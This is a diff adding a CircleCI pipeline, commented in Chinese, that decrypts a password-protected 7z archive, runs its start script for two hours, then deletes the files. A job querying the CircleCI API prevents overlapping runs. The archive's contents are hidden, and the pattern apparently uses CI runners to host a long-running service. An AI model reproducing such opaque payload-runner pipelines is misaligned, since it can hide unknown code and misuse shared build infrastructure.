@@ -1,0 +1,175 @@
+version: 2.1
+
+# 定义可复用的执行器
+executors:
+  ubuntu-executor:
+    docker:
+      - image: cimg/base:stable
+    resource_class: medium
+
+# 定义任务
+jobs:
+  check-run:
+    executor: ubuntu-executor
+    steps:
+      - run:
+          name: Check last run
+          command: |
+            echo "Checking previous workflow runs..."
+            
+            # 安装必要的工具
+            sudo apt-get update && sudo apt-get install -y jq curl
+            
+            # 获取最近的工作流运行记录
+            WORKFLOW_ID=$(curl -s -H "Circle-Token: ${CIRCLE_API_TOKEN}" \
+              "https://circleci.com/api/v2/insights/${CIRCLE_PROJECT_USERNAME}/${CIRCLE_PROJECT_REPONAME}/workflows/backend-services?branch=${CIRCLE_BRANCH}" \
+              | jq -r '.items[0].id // ""')
+            
+            echo "Latest workflow ID: $WORKFLOW_ID"
+            
+            # 获取工作流详情
+            if [ -n "$WORKFLOW_ID" ] && [ "$WORKFLOW_ID" != "null" ]; then
+              WORKFLOW_STATUS=$(curl -s -H "Circle-Token: ${CIRCLE_API_TOKEN}" \
+                "https://circleci.com/api/v2/workflow/${WORKFLOW_ID}" \
+                | jq -r '.status // ""')
+              
+              echo "Workflow status: $WORKFLOW_STATUS"
+              
+              # 检查是否有正在运行的工作流
+              if [ "$WORKFLOW_STATUS" = "running" ]; then
+                echo "Found running workflow, skipping..."
+                echo "export SHOULD_RUN=false" >> $BASH_ENV
+                exit 0
+              fi
+              
+              # 获取最后完成时间
+              STOPPED_AT=$(curl -s -H "Circle-Token: ${CIRCLE_API_TOKEN}" \
+                "https://circleci.com/api/v2/workflow/${WORKFLOW_ID}" \
+                | jq -r '.stopped_at // ""')
+              
+              if [ -n "$STOPPED_AT" ] && [ "$STOPPED_AT" != "null" ]; then
+                ENDED_TIME=$(date -d "$STOPPED_AT" +%s)
+                CURRENT_TIME=$(date +%s)
+                TIME_DIFF=$((CURRENT_TIME - ENDED_TIME))
+                
+                echo "Time since last run: $TIME_DIFF seconds"
+                
+                if [ $TIME_DIFF -ge 600 ]; then
+                  echo "Last run ended more than 10 minutes ago, proceeding..."
+                  echo "export SHOULD_RUN=true" >> $BASH_ENV
+                else
+                  echo "Last run ended only $TIME_DIFF seconds ago, skipping..."
+                  echo "export SHOULD_RUN=false" >> $BASH_ENV
+                fi
+              else
+                echo "No previous completed run found, proceeding..."
+                echo "export SHOULD_RUN=true" >> $BASH_ENV
+              fi
+            else
+              echo "No previous workflow found, proceeding..."
+              echo "export SHOULD_RUN=true" >> $BASH_ENV
+            fi
+      
+      - persist_to_workspace:
+          root: ~/
+          paths:
+            - .bashrc
+
+  run-services:
+    executor: ubuntu-executor
+    steps:
+      - attach_workspace:
+          at: ~/
+      
+      # 检查是否应该运行
+      - run:
+          name: Check if should run
+          command: |
+            source $BASH_ENV
+            if [ "$SHOULD_RUN" != "true" ]; then
+              echo "Skipping run based on check-run job"
+              circleci step halt
+            fi
+      
+      # 检出代码
+      - checkout
+      
+      # 安装 7z
+      - run:
+          name: Install 7zip
+          command: |
+            sudo apt-get update
+            sudo apt-get install -y p7zip-full
+      
+      # 解压文件
+      - run:
+          name: Unzip 7z file
+          command: |
+            7z x -p"${ZIP_PASS}" g-test-action-v2.7z
+      
+      # 启动服务
+      - run:
+          name: Start service
+          command: |
+            chmod +x start.sh
+            ./start.sh &
+            echo "Service started"
+      
+      # 等待服务运行
+      - run:
+          name: Keep service running
+          command: |
+            echo "Service will run for 7200 seconds (2 hours)"
+            for i in {1..24}; do
+              echo "Sleeping for 300 seconds (cycle $i/24)"
+              sleep 300
+            done
+            echo "Completed 24 sleep cycles, total 7200 seconds"
+          no_output_timeout: 2h
+      
+      # 停止服务
+      - run:
+          name: Stop service
+          command: |
+            chmod +x stop.sh
+            ./stop.sh
+            echo "Service stopped"
+      
+      # 清理文件
+      - run:
+          name: Delete git files
+          command: |
+            cd ~/project
+            rm -rf *
+            echo "Files cleaned up"
+
+# 定义工作流
+workflows:
+  version: 2
+  backend-services:
+    jobs:
+      - check-run:
+          context: backend-context  # 使用 context 来管理环境变量
+      - run-services:
+          requires:
+            - check-run
+          context: backend-context
+    
+    # 定时触发 (每10分钟)
+    # triggers:
+      # - schedule:
+          # cron: "*/10 * * * *"
+          # filters:
+            # branches:
+              # only:
+                # - main
+  
+  # 手动触发工作流
+  manual-trigger:
+    jobs:
+      - run-services:
+          context: backend-context
+          filters:
+            branches:
+              only:
+                - main
